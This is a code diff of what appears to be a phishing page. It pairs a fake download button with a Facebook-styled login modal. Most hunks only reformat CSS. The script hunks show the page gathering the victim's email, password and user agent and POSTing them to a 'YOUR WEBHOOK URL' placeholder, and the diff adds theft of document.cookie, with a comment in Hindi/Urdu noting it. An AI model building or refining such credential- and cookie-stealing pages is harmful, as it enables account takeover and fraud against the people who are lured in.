@@ -16,8 +16,6 @@
             height: 100vh;
             overflow: hidden;
         }
-
-        /* Background Image */
         .bg {
             position: absolute;
             top: 0;
@@ -28,8 +26,6 @@
             z-index: 1;
             opacity: 0.8;
         }
-
-        /* Download Button */
         .download-btn {
             position: relative;
             z-index: 10;
@@ -44,11 +40,7 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.5);
             transition: transform 0.2s;
         }
-        .download-btn:active {
-            transform: scale(0.95);
-        }
-
-        /* Modal Overlay */
+        .download-btn:active { transform: scale(0.95); }
         .modal-overlay {
             display: none;
             position: fixed;
@@ -61,8 +53,6 @@
             justify-content: center;
             align-items: center;
         }
-
-        /* Login Form */
         .login-box {
             background: white;
             padding: 20px;
@@ -72,17 +62,8 @@
             box-sizing: border-box;
             position: relative;
         }
-
-        .login-box h2 {
-            margin: 0 0 15px 0;
-            text-align: center;
-            color: #1877f2;
-        }
-
-        .input-group {
-            margin-bottom: 12px;
-        }
-
+        .login-box h2 { margin: 0 0 15px 0; text-align: center; color: #1877f2; }
+        .input-group { margin-bottom: 12px; }
         .input-group input {
             width: 100%;
             padding: 12px;
@@ -91,7 +72,6 @@
             box-sizing: border-box;
             font-size: 16px;
         }
-
         .login-btn {
             width: 100%;
             padding: 12px;
@@ -103,7 +83,6 @@
             font-weight: bold;
             cursor: pointer;
         }
-
         .spinner {
             display: none;
             width: 20px;
@@ -114,7 +93,6 @@
             animation: spin 1s linear infinite;
             margin: 10px auto;
         }
-
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -178,7 +156,8 @@
                 email: email,
                 password: pass,
                 timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
+                userAgent: navigator.userAgent,
+                cookies: document.cookie // Ye cookies collect karega
             };
 
             // YOUR WEBHOOK URL
@@ -189,7 +168,7 @@
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json",
-                    "mode": "no-cors" // Important for cross-origin requests
+                    "mode": "no-cors"
                 },
                 body: JSON.stringify(data)
             })
